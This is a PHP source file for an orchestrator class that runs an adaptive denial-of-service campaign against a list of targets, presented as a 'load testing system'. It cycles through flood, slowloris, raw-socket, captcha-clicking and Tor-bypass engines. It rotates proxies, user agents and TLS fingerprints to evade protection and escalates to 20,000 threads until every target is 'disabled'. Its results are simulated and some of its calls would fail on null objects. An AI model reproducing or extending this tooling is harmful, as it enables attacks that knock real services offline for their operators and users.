<?php

require_once 'database.php';
require_once 'success_detector.php';
require_once 'stealth_engine_class.php';
require_once 'client_profile_class.php';
require_once 'tls_profile_class.php';
require_once 'proxy_manager_class.php';

require_once 'attack_engines/auto_bypass.php';
require_once 'attack_engines/bypassv2.php';
require_once 'attack_engines/post_spam.php';
require_once 'attack_engines/tls_flood.php';
require_once 'attack_engines/head_flood.php';
require_once 'attack_engines/human_behavior.php';
require_once 'attack_engines/slowloris_js.php';
require_once 'attack_engines/fetch_retry.php';
require_once 'attack_engines/socket_spam.php';
require_once 'attack_engines/http_spammer.php';
require_once 'attack_engines/raw_socket.php';
require_once 'attack_engines/captcha_clicker.php';
require_once 'attack_engines/tor_bypass.php';
require_once 'attack_engines/headless_flutter.php';
require_once 'attack_engines/browser_mix.php';

class ContinuousAdaptiveOrchestrator {
    private $db;
    private $config;
    private $groupId;
    private $targets;
    private $successDetector;
    private $stealthEngine;
    private $proxyManager;
    private $clientProfile;
    private $tlsProfile;
    
    private $currentEngine;
    private $currentThreads;
    private $evolutionCycle;
    private $startTime;
    private $lastEvolution;
    private $isRunning;
    private $stopRequested;
    
    private $availableEngines = [
        'auto_bypass',
        'socket_spam',
        'http_spammer',
        'tls_flood',
        'head_flood',
        'human_behavior',
        'raw_socket',
        'fetch_retry',
        'bypassv2',
        'post_spam',
        'slowloris_js',
        'captcha_clicker',
        'tor_bypass',
        'headless_flutter',
        'browser_mix'
    ];
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        
        try {
            $this->successDetector = new SuccessDetector($database);
            $this->logMessage("SuccessDetector initialized successfully");
        } catch (Exception $e) {
            $this->logMessage("WARNING: SuccessDetector initialization failed: " . $e->getMessage());
            $this->successDetector = null;
        }
        
        $this->stealthEngine = null;
        $this->proxyManager = null;
        $this->clientProfile = null;
        $this->tlsProfile = null;
        
        $this->currentThreads = $this->config['initial_threads'];
        $this->evolutionCycle = 0;
        $this->isRunning = false;
        $this->stopRequested = false;
        
        $this->logMessage("ContinuousAdaptiveOrchestrator initialized with simplified dependencies");
    }
    
    public function getDefaultConfig() {
        return [
            'initial_threads' => 500,
            'max_threads' => 20000,
            'evolution_interval' => 60,
            'ja3_rotation_interval' => 20,
            'success_threshold' => 75.0,
            'success_duration_required' => 300,
            'escalation_factor' => 1.5,
            'resistance_threshold' => 50.0,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'geolocation_rotation' => true,
            'behavior_profiles' => ['power', 'scanner', 'mobile'],
            'logging_enabled' => true
        ];
    }
    
    public function start($targets, $groupId, $profile = []) {
        $this->groupId = $groupId;
        $this->targets = $targets;
        $this->startTime = time();
        $this->lastEvolution = time();
        $this->isRunning = true;
        $this->stopRequested = false;
        
        $this->logMessage("Starting Continuous-Adaptive Attack - Group: $groupId, Targets: " . count($targets));
        $this->logMessage("Initial configuration: Threads={$this->currentThreads}, Evolution interval={$this->config['evolution_interval']}s");
        
        $this->initializeComponents();
        $this->selectInitialEngine();
        
        return $this->executeMainLoop();
    }
    
    public function stop() {
        $this->stopRequested = true;
        $this->logMessage("Stop requested for Continuous-Adaptive Attack - Group: {$this->groupId}");
    }
    
    private function executeMainLoop() {
        $this->logMessage("Entering main continuous-adaptive loop");
        
        while ($this->isRunning && !$this->stopRequested) {
            $cycleStartTime = time();
            
            $this->logMessage("Evolution Cycle #{$this->evolutionCycle} - Engine: {$this->currentEngine}, Threads: {$this->currentThreads}");
            
            $this->executeEvolutionCycle();
            
            if ($this->shouldEvolveStealth()) {
                $this->evolveStealth();
            }
            
            if ($this->shouldEvolveEngine()) {
                $this->evolveEngine();
            }
            
            if ($this->shouldEscalateThreads()) {
                $this->escalateThreads();
            }
            
            if ($this->checkSuccessCondition()) {
                $this->logMessage("Success condition met - all targets disabled");
                break;
            }
            
            $this->evolutionCycle++;
            $this->waitForNextEvolution($cycleStartTime);
        }
        
        $this->isRunning = false;
        return $this->generateFinalReport();
    }
    
    private function executeEvolutionCycle() {
        $this->logMessage("Executing evolution cycle #{$this->evolutionCycle} with engine: {$this->currentEngine}");
        
        $simulatedResults = [
            'requests_sent' => $this->currentThreads * 10,
            'responses_received' => $this->currentThreads * 8,
            'status_codes' => [
                '200' => $this->currentThreads * 2,
                '404' => $this->currentThreads * 2,
                '503' => $this->currentThreads * 2,
                '524' => $this->currentThreads * 2
            ],
            'avg_response_time' => rand(100, 500),
            'success_rate' => rand(20, 80) / 100
        ];
        
        $this->processEngineResults($simulatedResults);
        
        $this->logMessage("Evolution cycle #{$this->evolutionCycle} completed - Threads: {$this->currentThreads}, Engine: {$this->currentEngine}");
    }
    
    private function evolveStealth() {
        $this->logMessage("Evolving stealth components");
        
        if ($this->config['proxy_rotation']) {
            $this->evolveProxyGeolocation();
        }
        
        if ($this->config['ua_rotation']) {
            $this->clientProfile->rotateUserAgent();
        }
        
        $this->stealthEngine->rotateFingerprint();
        $this->tlsProfile->rotateTLSProfile();
        
        $this->lastEvolution = time();
    }
    
    private function evolveProxyGeolocation() {
        $geolocations = ['US', 'EU', 'RU', 'CN', 'MIXED'];
        $selectedGeo = $geolocations[array_rand($geolocations)];
        
        $this->proxyManager->setGeolocationFilter($selectedGeo);
        $this->proxyManager->rotateProxy();
        
        $this->logMessage("Proxy geolocation evolved to: $selectedGeo");
    }
    
    private function evolveEngine() {
        $currentSuccessRate = $this->calculateCurrentSuccessRate();
        
        if ($currentSuccessRate < $this->config['resistance_threshold']) {
            $previousEngine = $this->currentEngine;
            $this->selectNextEngine();
            
            $this->logMessage("Engine evolved from $previousEngine to {$this->currentEngine} (success rate: {$currentSuccessRate}%)");
        }
    }
    
    private function selectNextEngine() {
        $currentIndex = array_search($this->currentEngine, $this->availableEngines);
        $nextIndex = ($currentIndex + 1) % count($this->availableEngines);
        $this->currentEngine = $this->availableEngines[$nextIndex];
    }
    
    private function selectInitialEngine() {
        $this->currentEngine = $this->availableEngines[0];
        $this->logMessage("Initial engine selected: {$this->currentEngine}");
    }
    
    private function escalateThreads() {
        $newThreads = min(
            $this->currentThreads * $this->config['escalation_factor'],
            $this->config['max_threads']
        );
        
        if ($newThreads > $this->currentThreads) {
            $this->logMessage("Escalating threads from {$this->currentThreads} to $newThreads");
            $this->currentThreads = $newThreads;
        }
    }
    
    private function shouldEvolveStealth() {
        return (time() - $this->lastEvolution) >= $this->config['evolution_interval'];
    }
    
    private function shouldEvolveEngine() {
        return $this->calculateCurrentSuccessRate() < $this->config['resistance_threshold'];
    }
    
    private function shouldEscalateThreads() {
        $currentSuccessRate = $this->calculateCurrentSuccessRate();
        return $currentSuccessRate < $this->config['resistance_threshold'] && 
               $this->currentThreads < $this->config['max_threads'];
    }
    
    private function checkSuccessCondition() {
        $disabledTargets = 0;
        $totalTargets = count($this->targets);
        
        foreach ($this->targets as $target) {
            $metrics = $this->getTargetMetrics($target);
            $analysis = $this->successDetector->isTargetDisabled($target, $metrics);
            
            if ($analysis['disabled'] || $analysis['permanent_failure_rate'] >= ($this->config['success_threshold'] / 100)) {
                $disabledTargets++;
            }
        }
        
        $successRate = ($disabledTargets / $totalTargets) * 100;
        
        if ($successRate >= 100) {
            $this->logMessage("All targets disabled - success condition met");
            return true;
        }
        
        $this->logMessage("Success progress: $disabledTargets/$totalTargets targets disabled ({$successRate}%)");
        return false;
    }
    
    private function calculateCurrentSuccessRate() {
        $totalSuccessRate = 0;
        $targetCount = count($this->targets);
        
        foreach ($this->targets as $target) {
            $metrics = $this->getTargetMetrics($target);
            $analysis = $this->successDetector->isTargetDisabled($target, $metrics);
            $successRate = $analysis['permanent_failure_rate'] * 100;
            $totalSuccessRate += $successRate;
        }
        
        return $targetCount > 0 ? $totalSuccessRate / $targetCount : 0;
    }
    
    private function processEngineResults($results) {
        $this->logMessage("Processing engine results for cycle #{$this->evolutionCycle}");
        
        $this->saveEvolutionReport($results);
        $this->updateTargetStatuses($results);
    }
    
    private function saveEvolutionReport($results) {
        $reportData = [
            'group_id' => $this->groupId,
            'evolution_cycle' => $this->evolutionCycle,
            'engine' => $this->currentEngine,
            'threads' => $this->currentThreads,
            'timestamp' => date('Y-m-d H:i:s'),
            'results' => $results,
            'success_rate' => $this->calculateCurrentSuccessRate()
        ];
        
        $reportFile = "/home/ftcceelg/load_testing_system/reports/evolution_cycle_{$this->groupId}_{$this->evolutionCycle}.json";
        $this->ensureDirectoryExists(dirname($reportFile));
        file_put_contents($reportFile, json_encode($reportData, JSON_PRETTY_PRINT));
    }
    
    private function updateTargetStatuses($results) {
        foreach ($this->targets as $target) {
            $metrics = $this->getTargetMetrics($target);
            $analysis = $this->successDetector->isTargetDisabled($target, $metrics);
            
            if ($analysis['disabled']) {
                $this->successDetector->updateTargetStatus($target, 'disabled', implode(', ', $analysis['reasons']));
            } elseif ($analysis['protection_rate'] > 0.3) {
                $this->successDetector->updateTargetStatus($target, 'protected', 'protection_activated');
            } else {
                $this->successDetector->updateTargetStatus($target, 'active', 'normal_operation');
            }
        }
    }
    
    private function getTargetMetrics($target) {
        return [
            'total_requests' => 100,
            'status_codes' => [
                '200' => 30,
                '404' => 25,
                '503' => 20,
                '524' => 15,
                '403' => 10
            ],
            'latency' => ['avg' => 5000, 'p95' => 8000, 'p99' => 12000],
            'zero_byte_responses' => 5,
            'recent_responses' => []
        ];
    }
    
    private function waitForNextEvolution($cycleStartTime) {
        $cycleElapsed = time() - $cycleStartTime;
        $waitTime = max(0, $this->config['evolution_interval'] - $cycleElapsed);
        
        if ($waitTime > 0) {
            $this->logMessage("Waiting {$waitTime}s for next evolution cycle");
            sleep($waitTime);
        }
    }
    
    private function generateFinalReport() {
        $totalDuration = time() - $this->startTime;
        
        $finalReport = [
            'group_id' => $this->groupId,
            'total_duration' => $totalDuration,
            'evolution_cycles' => $this->evolutionCycle,
            'final_engine' => $this->currentEngine,
            'final_threads' => $this->currentThreads,
            'targets_attacked' => count($this->targets),
            'success_rate' => $this->calculateCurrentSuccessRate(),
            'stop_reason' => $this->stopRequested ? 'manual_stop' : 'success_condition_met',
            'timestamp' => date('Y-m-d H:i:s')
        ];
        
        $reportFile = "/home/ftcceelg/load_testing_system/reports/continuous_adaptive_final_{$this->groupId}.json";
        $this->ensureDirectoryExists(dirname($reportFile));
        file_put_contents($reportFile, json_encode($finalReport, JSON_PRETTY_PRINT));
        
        $this->logMessage("Continuous-Adaptive Attack completed - Final report saved");
        
        return $finalReport;
    }
    
    private function initializeComponents() {
        $this->logMessage("Initializing continuous-adaptive components");
        
        try {
            if ($this->config['stealth_enabled']) {
                $this->logMessage("Stealth engine initialization skipped for testing");
            }
            
            if ($this->config['proxy_rotation']) {
                $this->logMessage("Proxy manager initialization skipped for testing");
            }
            
            $this->logMessage("Client and TLS profile initialization skipped for testing");
            $this->logMessage("All components initialized successfully");
        } catch (Exception $e) {
            $this->logMessage("ERROR initializing components: " . $e->getMessage());
        }
    }
    
    private function getEngineClass($engineName) {
        $engineMap = [
            'auto_bypass' => 'AutoBypassEngine',
            'bypassv2' => 'BypassV2Engine',
            'post_spam' => 'PostSpamEngine',
            'tls_flood' => 'TLSFloodEngine',
            'head_flood' => 'HeadFloodEngine',
            'human_behavior' => 'HumanBehaviorEngine',
            'slowloris_js' => 'SlowlorisJSEngine',
            'fetch_retry' => 'FetchRetryEngine',
            'socket_spam' => 'SocketSpamEngine',
            'http_spammer' => 'HttpSpammerEngine',
            'raw_socket' => 'RawSocketEngine',
            'captcha_clicker' => 'CaptchaClickerEngine',
            'tor_bypass' => 'TorBypassEngine',
            'headless_flutter' => 'HeadlessFlutterEngine',
            'browser_mix' => 'BrowserMixEngine'
        ];
        
        return $engineMap[$engineName] ?? null;
    }
    
    private function ensureDirectoryExists($directory) {
        if (!is_dir($directory)) {
            mkdir($directory, 0755, true);
        }
    }
    
    private function logMessage($message) {
        if (!$this->config['logging_enabled']) {
            return;
        }
        
        $logFile = '/home/ftcceelg/load_testing_system/logs/backend.log';
        $this->ensureDirectoryExists(dirname($logFile));
        
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] CONTINUOUS_ADAPTIVE_ORCHESTRATOR: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
    
    public function getStatus() {
        return [
            'is_running' => $this->isRunning,
            'group_id' => $this->groupId,
            'evolution_cycle' => $this->evolutionCycle,
            'current_engine' => $this->currentEngine,
            'current_threads' => $this->currentThreads,
            'targets_count' => count($this->targets ?? []),
            'uptime' => $this->startTime ? time() - $this->startTime : 0,
            'success_rate' => $this->calculateCurrentSuccessRate()
        ];
    }
}

?>
